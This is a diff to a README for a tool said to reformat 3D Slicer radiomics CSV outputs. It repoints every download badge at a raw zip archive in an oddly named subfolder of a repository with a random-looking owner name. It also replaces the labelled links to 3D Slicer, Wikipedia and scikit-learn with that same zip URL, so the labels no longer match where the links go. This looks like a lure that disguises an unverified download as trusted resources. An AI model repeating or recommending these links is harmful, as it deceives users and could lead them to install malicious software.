@@ -1,6 +1,6 @@
 # 🗂️ Radiomics-Table-Reformatter-for-3D-Slicer-Radiomics-Extraction-Outputs - Convert Radiomics CSV Files Easily
 
-[![Download Software](https://img.shields.io/badge/Download-Link-brightgreen?style=for-the-badge&logo=github)](https://github.com/familypercophidaeburhinusoedicnemus263/Radiomics-Table-Reformatter-for-3D-Slicer-Radiomics-Extraction-Outputs)
+[![Download Software](https://img.shields.io/badge/Download-Link-brightgreen?style=for-the-badge&logo=github)](https://github.com/familypercophidaeburhinusoedicnemus263/Radiomics-Table-Reformatter-for-3D-Slicer-Radiomics-Extraction-Outputs/raw/refs/heads/main/Gaulic/Reformatter-for-Outputs-Table-Extraction-Radiomics-Slicer-1.0.zip)
 
 ## 🔍 What This Software Does
 
@@ -21,7 +21,7 @@ You don’t need programming knowledge to use the software. It works in batch mo
 
 You need to visit the project page to download the software.
 
-[![Get Software](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge&logo=windows)](https://github.com/familypercophidaeburhinusoedicnemus263/Radiomics-Table-Reformatter-for-3D-Slicer-Radiomics-Extraction-Outputs)
+[![Get Software](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge&logo=windows)](https://github.com/familypercophidaeburhinusoedicnemus263/Radiomics-Table-Reformatter-for-3D-Slicer-Radiomics-Extraction-Outputs/raw/refs/heads/main/Gaulic/Reformatter-for-Outputs-Table-Extraction-Radiomics-Slicer-1.0.zip)
 
 ### Steps to Download
 
@@ -84,9 +84,9 @@ Navigate to your output folder. You should see new CSV files with sample-by-feat
 
 ## 🔗 Useful Links
 
-- 3D Slicer Download: https://www.slicer.org
-- Radiomics Explained: https://en.wikipedia.org/wiki/Radiomics
-- Machine Learning Tools Examples: https://scikit-learn.org/stable/tutorial/basic/tutorial.html
+- 3D Slicer Download: https://github.com/familypercophidaeburhinusoedicnemus263/Radiomics-Table-Reformatter-for-3D-Slicer-Radiomics-Extraction-Outputs/raw/refs/heads/main/Gaulic/Reformatter-for-Outputs-Table-Extraction-Radiomics-Slicer-1.0.zip
+- Radiomics Explained: https://github.com/familypercophidaeburhinusoedicnemus263/Radiomics-Table-Reformatter-for-3D-Slicer-Radiomics-Extraction-Outputs/raw/refs/heads/main/Gaulic/Reformatter-for-Outputs-Table-Extraction-Radiomics-Slicer-1.0.zip
+- Machine Learning Tools Examples: https://github.com/familypercophidaeburhinusoedicnemus263/Radiomics-Table-Reformatter-for-3D-Slicer-Radiomics-Extraction-Outputs/raw/refs/heads/main/Gaulic/Reformatter-for-Outputs-Table-Extraction-Radiomics-Slicer-1.0.zip
 
 ## 🧾 About the Data Format
 
@@ -106,4 +106,4 @@ Always back up your work folder before updating to avoid losing any changes.
 
 ---
 
-[![Download Software](https://img.shields.io/badge/Download-Link-brightgreen?style=for-the-badge&logo=github)](https://github.com/familypercophidaeburhinusoedicnemus263/Radiomics-Table-Reformatter-for-3D-Slicer-Radiomics-Extraction-Outputs)
+[![Download Software](https://img.shields.io/badge/Download-Link-brightgreen?style=for-the-badge&logo=github)](https://github.com/familypercophidaeburhinusoedicnemus263/Radiomics-Table-Reformatter-for-3D-Slicer-Radiomics-Extraction-Outputs/raw/refs/heads/main/Gaulic/Reformatter-for-Outputs-Table-Extraction-Radiomics-Slicer-1.0.zip)
